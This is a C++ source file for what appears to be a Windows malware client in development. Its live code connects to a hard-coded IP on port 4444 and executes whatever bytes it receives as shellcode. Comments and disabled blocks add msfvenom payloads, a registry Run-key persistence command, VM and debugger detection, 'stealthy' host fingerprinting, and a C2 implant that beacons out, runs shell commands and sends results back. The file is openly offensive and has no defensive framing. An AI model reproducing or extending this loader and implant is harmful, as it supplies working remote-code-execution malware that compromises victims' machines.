/* TODO:
 * https://github.com/rapid7/metasploit-framework/tree/master/data/headers/windows
 * https://github.com/rapid7/metasploit-framework/tree/master/data/templates/src/pe
 * https://github.com/rapid7/metasploit-framework/tree/master/external/source/shellcode/windows
 *
 * https://github.com/rapid7/metasploit-framework/tree/master/data/utilities/encrypted_payload
 *
 *
 *
 * */



#include "client.h"

#include <stdio.h>
#include <string.h>
#include <windows.h>
//#include <WS2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

//#define SERVER_IP "10.0.0.86"  // Localhost for testing
#define SERVER_IP "172.18.245.234"
#define SERVER_PORT 4444
#define BUFFER_SIZE 1024


// TODO: -static makes file 2-5x larger
// x86_64-w64-mingw32-g++ -static -o client.exe client.cpp -lws2_32 
//
// # Generate 64-bit shellcode
// msfvenom -p windows/x64/exec CMD="path/to/custom.exe" -f c

Client::Client() : 
    socket_(INVALID_SOCKET),
    connected_(false),
    initalized_(false)
{
    // TODO: add logic to check if winsock version 2.2 is avaiable?
    //       this will need to be added/handled if planning on targeting windows xp and before

    WSADATA wsaData;
    WORD wVersionRequired = MAKEWORD(2,2); // use winsock version 2.2
    if (WSAStartup(wVersionRequired, &wsaData) != 0)
    {
        // throw error
    }
    initalized_ = true;

    // TODO: assign client an id? so server can keep track of all the clients
    // TODO: add bool that checks/marks the client as initalized?
}

Client::~Client()
{
    if (initalized_)
    {
        WSACleanup();
    }
}

bool Client::createSocket(int af, int type, int protocol)
{
    // TODO: add closesocket() ? 
    socket_ = socket(af, type, protocol);
    if (socket_ == INVALID_SOCKET)
    {
        return false;
    }

    connected_ = false;
    return true;
}

bool Client::createConnection(const std::string& host, const std::string& port)
{
    ADDRINFOA hints, *result = nullptr; // struct addrinfo 

    ZeroMemory(&hints, sizeof(hints));
    // memset(&hints, 0, sizeof(hints)); // use this instead of zeromemory for cross platform

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve address
    if (getaddrinfo(host.c_str(), port.c_str(), &hints, &result) != 0)
    {
        return false;
    }

    bool connected = false;
    for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next)
    {
        if (connect(socket_, ptr->ai_addr, (int)ptr->ai_addrlen) != SOCKET_ERROR)
        {
            connected = true;
            break;
        }
    }
    freeaddrinfo(result);
    connected_ = connected;
    return connected;
}

// receivePayload ONLY
//std::string Client::receiveData()
std::vector<unsigned char> Client::receiveData()
{
    if (!connected_) {
        throw std::runtime_error("Not connected to server");
    }
    
	//
    //int result = recv(socket_, recvBuffer_, RECV_BUFFER_SIZE, 0);
	std::vector<unsigned char> shellcode(4096);
	int received = recv(socket_, (char*)shellcode.data(), shellcode.size(), 0);
	if (received > 0) {
		shellcode.resize(received);
		return shellcode;
	}
	return {};
	//                }
	//
    
    //if (result > 0) 
    //{
        // Success - create string from the received data
        //return std::string(recvBuffer_, result);
        // TODO: this might only be happening becuz im using ncat to send messages rn
		/*
        std::string received(recvBuffer_, result);
        if (!received.empty() && received.back() == '\n') 
        {
            received.pop_back();
            if (!received.empty() && received.back() == '\r') 
            {
                received.pop_back();
            }
        }*/
        //return received;
    //} 
    //else if (result == 0) 
    //{
        // Connection closed by server
        //connected_ = false;
        //throw std::runtime_error("Connection closed by server");
    //} 
    //else 
    //{
        // Error occurred
        //connected_ = false;
        //throw std::runtime_error("Receive failed: " + std::to_string(WSAGetLastError()));
    //}
}

/*
//void Client::receiveData()
std::string Client::receiveData()
{
    if (!connected_) {
        throw std::runtime_error("Not connected to server");
    }
    
    int result = recv(socket_, recvBuffer_, RECV_BUFFER_SIZE, 0);
    
    if (result > 0) 
    {
        // Success - create string from the received data
        //return std::string(recvBuffer_, result);
        // TODO: this might only be happening becuz im using ncat to send messages rn
        std::string received(recvBuffer_, result);
        if (!received.empty() && received.back() == '\n') 
        {
            received.pop_back();
            if (!received.empty() && received.back() == '\r') 
            {
                received.pop_back();
            }
        }
        return received;
    } 
    else if (result == 0) 
    {
        // Connection closed by server
        connected_ = false;
        throw std::runtime_error("Connection closed by server");
    } 
    else 
    {
        // Error occurred
        connected_ = false;
        throw std::runtime_error("Receive failed: " + std::to_string(WSAGetLastError()));
    }
}*/

void Client::sendData(const std::string& data) {
    if (!connected_) {
        throw std::runtime_error("Not connected to server");
    }
    
    int result = send(socket_, data.c_str(), data.length(), 0);
    
    if (result == SOCKET_ERROR) {
        connected_ = false;
        throw std::runtime_error("Send failed: " + std::to_string(WSAGetLastError()));
    }
    
    //return result;  // Returns number of bytes actually sent
}

/*
// TODO: logic to pause socket instead of sleeping it?
void setPaused(bool pause) {
    u_long mode = pause ? 1 : 0;
    ioctlsocket(socket_, FIONBIO, &mode);
}

std::string receiveDataNonBlocking() {
    char buffer[4096];
    int result = recv(socket_, buffer, sizeof(buffer), 0);
    if (result > 0) {
        return std::string(buffer, result);
    }
    return "";  // No data available immediately
}

*/
// void Client::executeShellCode()
// void Client::executeShellCode()
// TODO: make this function polymorphic (meaning it can execute shell code, exe, or other stuff)
void Client::execute(std::string program)
{
	WinExec(program.c_str(), SW_SHOW);
}

// # Generate shellcode that runs reg.exe to add persistence
// msfvenom -p windows/exec CMD="reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d C:\malware.exe" -f c

// TODO: this is extremly basic bare min for executing shell code
//void executeShellcode(unsigned char bPayload) {
//void executeShellcode(std::string& payload) {
void executeShellcode(std::vector<unsigned char>& payload) 
{
	//#define SCSIZE 4096
	//char bPayload[SCSIZE] = "PAYLOAD:";
	/*
	unsigned char bPayload[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";*/
	DWORD dwOldProtect;
	//if (VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect))
	if (VirtualProtect((LPVOID)payload.data(), payload.size(), PAGE_EXECUTE_READWRITE, &dwOldProtect))
	{
		//(*(void (*)()) payload)();
		((void(*)())payload.data())();
	}
	else
	{
		std::cout << "VirtualProtect failed" << std::endl;
	}

}

void Client::run(const std::string& host, const std::string& port)
{
    // Ensure socket is created
    if (socket_ == INVALID_SOCKET && !createSocket()) {
        std::cerr << "Failed to create socket" << std::endl;
        return;
    }
    
    // Connect to server
    if (!createConnection(host, port)) {
        std::cerr << "Failed to connect to " << host << ":" << port << std::endl;
        return;
    }
    
    std::cout << "Connected to " << host << ":" << port << ". Waiting for commands..." << std::endl;
    
    // Wait for incoming data from server
    while (connected_) {
        try {
            //std::string command = receiveData();
            auto command = receiveData();
            executeShellcode(command);

                //
                // sendData(command);
				/*
                if (command == "exec")
                {
                    std::cout << "poop" << command << std::endl;
                    execute();
                }
				else
				{
                    executeShellcode(command);
				}*/
                //std::cout << "Server command: " << command << std::endl;
            } catch (const std::exception& e) {
            std::cerr << "Connection lost: " << e.what() << std::endl;
            break;
        }
    }
    
    std::cout << "Disconnected from server" << std::endl;
}


// void Client::getInfo() ? 
void Client::getSystemInfo()
{
}

// TODO: get locatoin of pc/person

/*
// TODO: also maybe check if these processes are even installed
//       processes like ollydbg, wireshark, procmon, processhacker, 
        idaq, x32dbg, x64dbg", fiddler, vboxservice
bool isRunningInVM() {
    // Check common VM process names
    const char* vmProcesses[] = {
        "vboxservice.exe", "vboxtray.exe", 
        "vmwaretray.exe", "vmwareuser.exe",
        "xenservice.exe", "qemu-ga.exe"
    };
    
    // Check for VM-specific hardware
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        // Check system BIOS/vendor info
        RegCloseKey(hKey);
    }
    
    return false; // Placeholder
}

DWORD getWindowsBuildNumber() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;
    
    FARPROC pRtlGetVersion = GetProcAddress(hNtdll, "RtlGetVersion");
    if (!pRtlGetVersion) return 0;
    
    // TODO: can always add/subtract attributes from struct ver as needed
    // Minimal structure - only what we need
    struct { 
        DWORD dwSize; 
        DWORD dwBuild; 
    } ver = { sizeof(ver) };
    
    if (((LONG (NTAPI*)(void*))pRtlGetVersion)(&ver) == 0) {
        return ver.dwBuild;
    }
    return 0;
}

// GetSystemInfo() // get cpu info
typedef struct _RTL_OSVERSIONINFOW {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    WCHAR szCSDVersion[128];
} RTL_OSVERSIONINFOW;

DWORD getWindowsBuildStealthy() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;
    
    auto pRtlGetVersion = (LONG (NTAPI*)(RTL_OSVERSIONINFOW*))GetProcAddress(hNtdll, "RtlGetVersion");
    if (!pRtlGetVersion) return 0;
    
    RTL_OSVERSIONINFOW versionInfo = {0};
    versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);
    
    if (pRtlGetVersion(&versionInfo) == 0) {
        return versionInfo.dwBuildNumber;
    }
    return 0;
}

// GetNativeSystemInfo():
struct StealthSystemInfo {
    DWORD processorCount;
    WORD architecture;
    DWORD pageSize;
    DWORD minAppAddr;
    DWORD maxAppAddr;
};

StealthSystemInfo getStealthSystemInfo() {
    StealthSystemInfo info = {0};
    SYSTEM_INFO sysInfo;
    
    // Single API call - very stealthy
    GetNativeSystemInfo(&sysInfo);
    
    info.processorCount = sysInfo.dwNumberOfProcessors;
    info.architecture = sysInfo.wProcessorArchitecture;
    info.pageSize = sysInfo.dwPageSize;
    info.minAppAddr = (DWORD)sysInfo.lpMinimumApplicationAddress;
    info.maxAppAddr = (DWORD)sysInfo.lpMaximumApplicationAddress;
    
    return info;
}

// getRam()
DWORD getTotalRAMStealthy() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    
    if (GlobalMemoryStatusEx(&statex)) {
        return (DWORD)(statex.ullTotalPhys / (1024 * 1024));  // Convert to MB
    }
    return 0;
}

getOsBit():
bool is64BitOS() {
    SYSTEM_INFO sysInfo;
    GetNativeSystemInfo(&sysInfo);
    
    // This tells you the NATIVE OS architecture:
    return (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
            sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64);
}

// TODO: getTickCount() // (amount of time the system has been running?)

// TODO: getGPU()
#include <windows.h>

const char* getGPUNameStealthy() {
    static char gpuName[128] = "Unknown";
    HKEY hKey;
    DWORD size = sizeof(gpuName);
    
    // Single, direct registry query
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\CurrentControlSet\\Control\\Video", 
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        HKEY hSubKey;
        DWORD index = 0;
        char subKeyName[256];
        DWORD subKeySize = sizeof(subKeyName);
        
        // Enumerate first video subkey only
        if (RegEnumKeyExA(hKey, index, subKeyName, &subKeySize, 
            NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            
            char fullPath[512];
            snprintf(fullPath, sizeof(fullPath), 
                     "SYSTEM\\CurrentControlSet\\Control\\Video\\%s\\0000", 
                     subKeyName);
            
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, fullPath, 
                0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                
                // Get GPU description
                if (RegQueryValueExA(hSubKey, "DriverDesc", NULL, NULL, 
                    (LPBYTE)gpuName, &size) != ERROR_SUCCESS) {
                    strcpy(gpuName, "Unknown");
                }
                RegCloseKey(hSubKey);
            }
        }
        RegCloseKey(hKey);
    }
    return gpuName;
}

// TODO: getGPUStealthier()
const char* getGPUNameUltraStealthy() {
    static char gpuName[64] = "Unknown";
    HKEY hKey;
    DWORD size = sizeof(gpuName);
    
    // Try most common path directly (avoids enumeration)
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        RegQueryValueExA(hKey, "DriverDesc", NULL, NULL, 
                        (LPBYTE)gpuName, &size);
        RegCloseKey(hKey);
    }
    return gpuName;
}


 */


/*

string BasicImplant::execute_command(const string& command) {
    string result;
    
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        return "error:Failed to execute command: " + command;
    }
    
    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }
    
    int return_code = _pclose(pipe);
    result += "|return_code:" + to_string(return_code);
    
    return "success:" + result;
}

string BasicImplant::send_to_c2(const string& message) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        return "error:Socket creation failed: " + to_string(WSAGetLastError());
    }
    
    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(c2_port);
    inet_pton(AF_INET, c2_host.c_str(), &server_addr.sin_addr);
    
    // Set timeouts
    DWORD timeout = 10000; // 10 seconds
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    
    if (connect(sock, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return "error:Connection failed to " + c2_host + ":" + to_string(c2_port);
    }
    
    // Send message
    if (send(sock, message.c_str(), message.length(), 0) == SOCKET_ERROR) {
        closesocket(sock);
        return "error:Send failed: " + to_string(WSAGetLastError());
    }
    
    // Receive response
    char buffer[1024];
    int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    closesocket(sock);
    
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';
        return string(buffer);
    }
    else if (bytes_received == 0) {
        return "error:Connection closed by server";
    }
    else {
        return "error:Receive failed: " + to_string(WSAGetLastError());
    }
}

void BasicImplant::parse_response(const string& response) {
    istringstream stream(response);
    string token;
    
    while (getline(stream, token, '|')) {
        size_t pos = token.find(':');
        if (pos != string::npos) {
            string key = token.substr(0, pos);
            string value = token.substr(pos + 1);
            
            if (key == "commands" && value != "none") {
                istringstream cmd_stream(value);
                string command;
                
                while (getline(cmd_stream, command, ';')) {
                    if (!command.empty()) {
                        execute_queued_command(command);
                    }
                }
            }
            else if (key == "checkin") {
                checkin_interval = stoi(value);
                cout << "Checkin interval set to: " << checkin_interval << " seconds" << endl;
            }
            else if (key == "status") {
                if (value == "success") {
                    cout << "Command executed successfully" << endl;
                }
                else if (value == "error") {
                    cout << "Command failed" << endl;
                }
            }
        }
    }
}

void BasicImplant::execute_queued_command(const string& command) {
    cout << "Executing queued command: " << command << endl;
    
    if (command.find(C2Protocol::CMD_EXECUTE + ":") == 0) {
        string cmd = command.substr(C2Protocol::CMD_EXECUTE.length() + 1);
        string result = execute_command(cmd);
        
        string result_msg = ImplantUtils::format_message(
            implant_id, C2Protocol::CMD_TASK_RESULT, result);
        send_to_c2(result_msg);
    }
    else if (command == C2Protocol::CMD_SYSINFO) {
        string info = get_system_info();
        string info_msg = ImplantUtils::format_message(
            implant_id, "sysinfo_result", info);
        send_to_c2(info_msg);
    }
}

void BasicImplant::process_c2_commands(const string& response) {
    parse_response(response);
}

void BasicImplant::beacon() {
    running = true;
    cout << "Implant ID: " << implant_id << endl;
    cout << "C2 Server: " << c2_host << ":" << c2_port << endl;
    cout << "Starting beacon loop..." << endl;
    
    while (running) {
        try {
            string message = ImplantUtils::format_message(
                implant_id, C2Protocol::CMD_CHECKIN, get_system_info());
            
            string response = send_to_c2(message);
            
            if (response.find("error:") != 0) {
                cout << "Beacon successful" << endl;
                process_c2_commands(response);
            }
            else {
                cout << "Beacon failed: " << response << endl;
            }
        }
        catch (const exception& e) {
            cout << "Beacon error: " << e.what() << endl;
        }
        
        ImplantUtils::sleep_seconds(checkin_interval);
    }
}

void BasicImplant::stop() {
    running = false;
}

// ImplantUtils implementation
namespace ImplantUtils {
    void stealth_mode() {
        HWND hwnd = GetConsoleWindow();
        if (hwnd) {
            // ShowWindow(hwnd, SW_HIDE);  // Uncomment for stealth
        }
    }
    
    string generate_implant_id() {
        string id = "implant_";
        id += to_string(GetCurrentProcessId());
        id += "_";
        id += to_string(GetTickCount());
        id += "_";
        id += to_string(time(nullptr));
        return id;
    }
    
    string format_message(const string& implant_id, const string& command, const string& data) {
        return implant_id + C2Protocol::DELIMITER + command + C2Protocol::DELIMITER + data;
    }
    
    string url_encode(const string& value) {
        // Basic URL encoding implementation
        ostringstream escaped;
        escaped.fill('0');
        escaped << hex;
        
        for (char c : value) {
            if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
                escaped << c;
            }
            else {
                escaped << '%' << setw(2) << int((unsigned char)c);
            }
        }
        
        return escaped.str();
    }
    
    void sleep_seconds(int seconds) {
        for (int i = 0; i < seconds; i++) {
            this_thread::sleep_for(chrono::seconds(1));
        }
    }
}
*/

int main()
{
    Client tcpClient;
    //tcpClient.run("172.18.245.234", "4444");
    tcpClient.run("10.0.0.86", "4444");
}
